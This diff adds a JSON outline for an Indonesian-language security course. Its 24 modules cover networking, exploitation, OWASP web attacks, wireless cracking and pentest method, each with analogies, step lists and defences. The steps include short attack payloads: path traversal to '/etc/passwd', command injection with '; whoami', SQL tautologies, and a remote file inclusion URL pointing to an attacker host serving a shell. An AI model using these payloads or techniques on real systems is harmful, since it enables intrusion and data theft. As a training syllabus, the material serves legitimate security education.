@@ -1,0 +1,634 @@
+[
+  [
+    1,
+    "Pengantar Cyber Security & Networking",
+    "Dasar cyber security dan networking.",
+    [
+      [
+        "Cyber Security",
+        "SATPAM GEDUNG. Firewall=jagain pintu."
+      ],
+      [
+        "Red vs Blue",
+        "Red=nyerang. Blue=bertahan."
+      ],
+      [
+        "Networking",
+        "IP=alamat rumah. Port=pintu."
+      ]
+    ],
+    [
+      "Pahami 7 layer OSI",
+      "Belajar IP, subnet",
+      "Kenali protokol: HTTP, SSH, DNS",
+      "Cek IP: ip a / ipconfig",
+      "Cek port: nc -zv target 22 80"
+    ],
+    [
+      "Update sistem",
+      "Gunakan firewall"
+    ]
+  ],
+  [
+    2,
+    "Kriptografi & TOR",
+    "Encoding, enkripsi, hash, TOR, SSH Tunnel.",
+    [
+      [
+        "Encode vs Enkripsi",
+        "Encode=BAHASA SANDI. Enkripsi=KUNCI RAHASIA."
+      ],
+      [
+        "Hash",
+        "SIDIK JARI digital."
+      ],
+      [
+        "TOR",
+        "SURAT BERANTAI lewat banyak pos."
+      ]
+    ],
+    [
+      "Base64 encode/decode",
+      "Hash file: md5sum, sha256sum",
+      "Crack MD5: hashcat",
+      "Coba TOR",
+      "SSH Tunnel"
+    ],
+    [
+      "Encoding != enkripsi",
+      "Gunakan SHA256"
+    ]
+  ],
+  [
+    3,
+    "VirtualBox, Docker & Linux Dasar",
+    "Virtualisasi dan command line.",
+    [
+      [
+        "Virtualisasi",
+        "RUMAH BONEKA di dalam rumah."
+      ],
+      [
+        "Docker",
+        "KONTRAKAN INSTAN."
+      ],
+      [
+        "Linux",
+        "ILMU SIHIR: ls, cd, rm."
+      ]
+    ],
+    [
+      "Install VirtualBox, buat VM",
+      "Command: ls, cd, pwd, mkdir",
+      "Install Apache",
+      "Install Docker",
+      "Jalankan DVWA: docker run"
+    ],
+    [
+      "Jangan expose VM ke publik"
+    ]
+  ],
+  [
+    4,
+    "Linux/BSD Server Setup",
+    "Instalasi server: Ubuntu, Apache, Nginx, MySQL, DNS.",
+    [
+      [
+        "Linux vs BSD",
+        "Linux=Toyota. FreeBSD=BMW. OpenBSD=Tank."
+      ]
+    ],
+    [
+      "Install Ubuntu Server",
+      "Install Apache, Nginx",
+      "Buat virtualhost",
+      "Install MySQL",
+      "Firewall: ufw"
+    ],
+    [
+      "Matikan service tidak perlu"
+    ]
+  ],
+  [
+    5,
+    "Kali Linux & Tools",
+    "Scanning, eksploitasi dasar, password grabbing.",
+    [
+      [
+        "Kali",
+        "KOTAK ALAT TUKANG."
+      ],
+      [
+        "Scanning",
+        "SATPAM keliling catat pintu terbuka."
+      ]
+    ],
+    [
+      "nmap -sn scan jaringan",
+      "nmap -sV -sC target",
+      "searchsploit cari exploit",
+      "routersploit",
+      "Metasploit: use exploit/..."
+    ],
+    [
+      "Update Kali",
+      "Jangan scan tanpa izin!"
+    ]
+  ],
+  [
+    6,
+    "Network Hacking",
+    "EternalBlue, SMBGhost, FTP, MikroTik.",
+    [
+      [
+        "SMB",
+        "LEMARI FILE BERSAMA."
+      ],
+      [
+        "EternalBlue",
+        "PINTU DARURAT lupa dikunci."
+      ],
+      [
+        "MikroTik",
+        "POS SATPAM kompleks."
+      ]
+    ],
+    [
+      "nmap --script smb-vuln-ms17-010",
+      "Exploit EternalBlue",
+      "Crack FTP: hydra",
+      "Hack MikroTik WinBox",
+      "DoS SMB"
+    ],
+    [
+      "Matikan SMBv1",
+      "Update Windows"
+    ]
+  ],
+  [
+    7,
+    "Nessus & Metasploit",
+    "Vulnerability scanning dan eksploitasi.",
+    [
+      [
+        "Nessus",
+        "DOKTER UMUM untuk komputer."
+      ],
+      [
+        "Metasploit",
+        "BENGKEL LENGKAP."
+      ]
+    ],
+    [
+      "Install Nessus, buat scan",
+      "Analisis hasil",
+      "Metasploit: use, set, run",
+      "Meterpreter: sysinfo, hashdump",
+      "msfvenom backdoor"
+    ],
+    [
+      "Update software",
+      "Segmentasi jaringan"
+    ]
+  ],
+  [
+    8,
+    "Buffer Overflow",
+    "Exploit development: fuzzing, EIP, shellcode.",
+    [
+      [
+        "BOF",
+        "GELAS keisi air penuh tumpah."
+      ],
+      [
+        "EIP",
+        "REMOTE TV perintah selanjutnya."
+      ],
+      [
+        "ASLR",
+        "POSISI LEMARI diacak."
+      ],
+      [
+        "DEP",
+        "LARANGAN nyalain api."
+      ]
+    ],
+    [
+      "Fuzzer Python",
+      "Cari offset dengan pattern",
+      "Kontrol EIP",
+      "Generate shellcode msfvenom",
+      "Bypass ASLR/DEP"
+    ],
+    [
+      "Aktifkan ASLR, DEP, CFG"
+    ]
+  ],
+  [
+    9,
+    "Linux Server Advanced",
+    "ARP spoofing, DoS, exploit dev Linux.",
+    [
+      [
+        "ARP Spoofing",
+        "MAMPERIN POS SATPAM."
+      ],
+      [
+        "DoS",
+        "NELPON TERUS-TERUSAN."
+      ]
+    ],
+    [
+      "ARP Spoof + tcpdump",
+      "DoS: ab -n 10000",
+      "Buffer overflow Linux GDB",
+      "Bypass DEP ROP manual"
+    ],
+    [
+      "Static ARP",
+      "Rate limiting"
+    ]
+  ],
+  [
+    10,
+    "Wazuh SIEM",
+    "Instalasi Wazuh: manager, agent, dashboard.",
+    [
+      [
+        "SIEM",
+        "PUSAT CCTV + SATPAM PINTAR."
+      ]
+    ],
+    [
+      "Install Wazuh script",
+      "Buka dashboard",
+      "Pasang agent di client",
+      "Tes deteksi SSH brute force"
+    ],
+    [
+      "Backup konfigurasi"
+    ]
+  ],
+  [
+    11,
+    "Web Information Gathering",
+    "OSINT, scanning, bypass Cloudflare, subdomain.",
+    [
+      [
+        "OSINT",
+        "JADI DETEKTIF - data publik."
+      ],
+      [
+        "Cloudflare",
+        "PAGAR RUMAH. Cari IP asli."
+      ]
+    ],
+    [
+      "WHOIS target.com",
+      "Google Dorking",
+      "subfinder subdomain",
+      "wafw00f deteksi WAF",
+      "gobuster dir",
+      "robots.txt, backup/"
+    ],
+    [
+      "Blokir akses langsung IP"
+    ]
+  ],
+  [
+    12,
+    "OWASP Top 10 Bagian 1 (A1-A5)",
+    "Broken Access, Crypto, Injection, Misconfig.",
+    [
+      [
+        "Access",
+        "Resepsionis kasih kunci kamar salah."
+      ],
+      [
+        "Injection",
+        "WARUNG: nasi goreng, kasih semua duit."
+      ]
+    ],
+    [
+      "Tes akses /admin, ganti user_id",
+      "Cek password hash",
+      "Tes Injection: OR 1=1",
+      "Cek directory listing"
+    ],
+    [
+      "RBAC",
+      "bcrypt",
+      "Prepared statement"
+    ]
+  ],
+  [
+    13,
+    "OWASP Top 10 Bagian 2 (A6-A10)",
+    "Outdated, Auth, Logging, SSRF, Google Dorking.",
+    [
+      [
+        "Outdated",
+        "MOBIL TAHUN 80an."
+      ],
+      [
+        "SSRF",
+        "SURATIN MENTARI ambil data internal."
+      ]
+    ],
+    [
+      "Google Dork: inurl:php?id=",
+      "Cari backup: ext:bak",
+      "Tes SSRF: 127.0.0.1:3306",
+      "Cek IDOR, logging, session"
+    ],
+    [
+      "Aktifkan logging",
+      "Blokir IP internal"
+    ]
+  ],
+  [
+    14,
+    "XSS Cross-Site Scripting",
+    "Reflected, Stored, cookie stealing, bypass.",
+    [
+      [
+        "XSS",
+        "CATATAN di papan pengumuman semua orang baca."
+      ],
+      [
+        "Stored",
+        "NULIS DI BUKU TAMU."
+      ]
+    ],
+    [
+      "<script>alert(1)</script> di parameter",
+      "<script> di komentar",
+      "Cookie stealer: Image src",
+      "Bypass WAF: img onerror",
+      "xsstrike scan"
+    ],
+    [
+      "htmlspecialchars",
+      "HttpOnly cookie",
+      "CSP header"
+    ]
+  ],
+  [
+    15,
+    "File Inclusion: LFI & RFI",
+    "Local/Remote File Inclusion, log poisoning.",
+    [
+      [
+        "LFI",
+        "MINTA FILE ke pustakawan terlalu nurut."
+      ],
+      [
+        "RFI",
+        "MAKANAN CATERING dari luar."
+      ]
+    ],
+    [
+      "?file=../../../etc/passwd",
+      "php://filter base64",
+      "LFI to RCE via log poisoning",
+      "RFI: ?page=http://attacker/shell.txt"
+    ],
+    [
+      "Matikan allow_url_include",
+      "Whitelist file"
+    ]
+  ],
+  [
+    16,
+    "IDOR, Upload & Command Injection",
+    "IDOR, webshell, Command Injection, CSRF.",
+    [
+      [
+        "IDOR",
+        "KUNCI KAMAR ORANG LAIN."
+      ],
+      [
+        "File Upload",
+        "TITIP PAKET tanpa diperiksa."
+      ],
+      [
+        "CSRF",
+        "NIPU SATPAM kartu palsu."
+      ]
+    ],
+    [
+      "Ganti user_id parameter",
+      "Upload shell.php",
+      "127.0.0.1; whoami",
+      "CSRF HTML auto-submit"
+    ],
+    [
+      "Cek akses tiap request",
+      "Validasi file upload"
+    ]
+  ],
+  [
+    17,
+    "SQL Injection Manual",
+    "Tautology, Blind, Time-based, Union SQLi.",
+    [
+      [
+        "SQLi",
+        "Resepsionis: kasi SEMUA kunci kamar!"
+      ],
+      [
+        "Tautology",
+        "Pernyataan selalu benar: OR 1=1"
+      ],
+      [
+        "Blind",
+        "TANYA BENER-SALAH huruf per huruf."
+      ]
+    ],
+    [
+      "Tes ' di parameter",
+      "Login: OR 1=1 --",
+      "ORDER BY cek kolom",
+      "UNION SELECT 1,2,3",
+      "Dump user,password"
+    ],
+    [
+      "Prepared statement WAJIB!"
+    ]
+  ],
+  [
+    18,
+    "SQLMAP & WAF Bypass",
+    "SQLMAP otomatisasi, ModSecurity.",
+    [
+      [
+        "SQLMAP",
+        "ROBOT VACUUM nyapu SQLi."
+      ],
+      [
+        "WAF",
+        "SATPAM pintu. Bypass = cari celah."
+      ]
+    ],
+    [
+      "sqlmap -u target --dump",
+      "--tamper=space2comment",
+      "Install ModSecurity + CRS",
+      "Tes bypass"
+    ],
+    [
+      "Jangan cuma andelin WAF"
+    ]
+  ],
+  [
+    19,
+    "API Pentesting",
+    "Fuzzing API, SQLi/LFI/CI di API.",
+    [
+      [
+        "API",
+        "PELAYAN RESTORAN client-dapur."
+      ]
+    ],
+    [
+      "Cari swagger.json, /api/docs",
+      "Fuzzing GET,POST,PUT,DELETE",
+      "SQLi di endpoint API",
+      "LFI: ../../../etc/passwd",
+      "Command Inj: ; whoami",
+      "Cek auth bypass"
+    ],
+    [
+      "API Gateway",
+      "Rate limiting"
+    ]
+  ],
+  [
+    20,
+    "Node.js & PHP Hardening",
+    "Keamanan Node.js, PHP disable function bypass.",
+    [
+      [
+        "Node.js",
+        "DAPUR CEPAT SAJI."
+      ],
+      [
+        "PHP",
+        "KUNCI MASTER."
+      ]
+    ],
+    [
+      "SQLi di Node.js",
+      "Bypass disable_function PHP",
+      "Install ModSecurity"
+    ],
+    [
+      "Helmet middleware",
+      "disable_function ketat"
+    ]
+  ],
+  [
+    21,
+    "Privilege Escalation & IR",
+    "Naikkan hak akses dan incident response.",
+    [
+      [
+        "PrivEsc",
+        "TAMU dapet KUNCI MANAJER."
+      ],
+      [
+        "IR",
+        "PEMADAM KEBAKARAN."
+      ]
+    ],
+    [
+      "find / -perm -4000 (SUID)",
+      "sudo -l",
+      "PwnKit CVE-2021-4034",
+      "last, cat auth.log",
+      "Cari backdoor: lsof -i"
+    ],
+    [
+      "Update kernel",
+      "Aktifkan auditd"
+    ]
+  ],
+  [
+    22,
+    "Wireless Hacking",
+    "WEP/WPA crack, Evil Twin, jamming.",
+    [
+      [
+        "WiFi",
+        "SINYAL RADIO siapa pun dengar."
+      ],
+      [
+        "WEP vs WPA",
+        "GEMBOK PLASTIK vs GEMBOK BESI."
+      ]
+    ],
+    [
+      "airmon-ng start wlan0",
+      "airodump-ng",
+      "aircrack-ng WEP",
+      "aireplay deauth capture WPA",
+      "aircrack-ng WPA wordlist",
+      "reaver WPS",
+      "airbase-ng Evil Twin"
+    ],
+    [
+      "WPA2/WPA3 password kuat",
+      "Matikan WPS"
+    ]
+  ],
+  [
+    23,
+    "PTES Standard",
+    "Penetration Testing Execution Standard.",
+    [
+      [
+        "PTES",
+        "RESEP MASAK standar internasional."
+      ]
+    ],
+    [
+      "Pre-engagement: proposal, NDA",
+      "Intel: OSINT, Shodan",
+      "Threat Modeling",
+      "Vuln Analysis",
+      "Exploitation PoC",
+      "Reporting teknis+eksekutif"
+    ],
+    [
+      "Simpan bukti",
+      "Patuhi aturan"
+    ]
+  ],
+  [
+    24,
+    "Career & Portfolio",
+    "Red/Blue, GRC, portfolio, STAR interview.",
+    [
+      [
+        "Red vs Blue",
+        "STRIKER vs BEK."
+      ],
+      [
+        "GRC",
+        "BAGIAN HUKUM."
+      ]
+    ],
+    [
+      "CV/LinkedIn security",
+      "Portfolio case study",
+      "STAR Interview",
+      "CTFtime.org",
+      "HackerOne/Bugcrowd",
+      "Sertifikasi: OSCP, CEH"
+    ],
+    [
+      "Karir luas",
+      "Soft skill penting"
+    ]
+  ]
+]
